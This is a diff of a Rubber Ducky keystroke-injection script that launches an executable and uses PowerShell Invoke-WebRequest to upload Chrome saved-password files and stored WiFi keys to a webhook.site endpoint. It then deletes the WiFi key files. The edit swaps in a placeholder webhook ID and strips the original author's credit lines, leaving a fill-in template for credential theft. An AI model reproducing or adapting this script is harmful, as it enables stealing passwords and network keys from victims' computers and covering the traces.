@@ -46,11 +46,11 @@ STRING ./yyyup7.exe
 DELAY 200
 ENTER
 DELAY 3000
-STRING powershell Invoke-WebRequest -Uri https://webhook.site/dbag -Method POST -InFile results\chrome_default_password.csv
+STRING powershell Invoke-WebRequest -Uri https://webhook.site/urwebhookhere -Method POST -InFile results\chrome_default_password.csv
 DELAY 200
 ENTER
 DELAY 3000
-STRING powershell Invoke-WebRequest -Uri https://webhook.site/dbag -Method POST -InFile results\chrome_user_2_password.csv
+STRING powershell Invoke-WebRequest -Uri https://webhook.site/urwebhookhere -Method POST -InFile results\chrome_user_2_password.csv
 DELAY 200
 ENTER
 DELAY 3000
@@ -69,9 +69,6 @@ DELAY 200
 ENTER
 REM aight
 REM Ducky Script for Steal Saved WiFi Password
-REM Author - TechChip
-REM https://github.com/techchipnet
-REM https://youtube.com/techchipnet
 DELAY 300
 GUI r
 DELAY 200
@@ -90,8 +87,7 @@ ENTER
 DELAY 500
 DELAY 300
 REM next command will post wifi password on webhook.site
-REM watch demo on techchip youtube channel
-STRING powershell Invoke-WebRequest -Uri https://webhook.site/dbag -Method POST -InFile WiFi-Key
+STRING powershell Invoke-WebRequest -Uri https://webhook.site/urwebhookhere -Method POST -InFile WiFi-Key
 ENTER
 STRING del Wi* /s/f/q
 ENTER
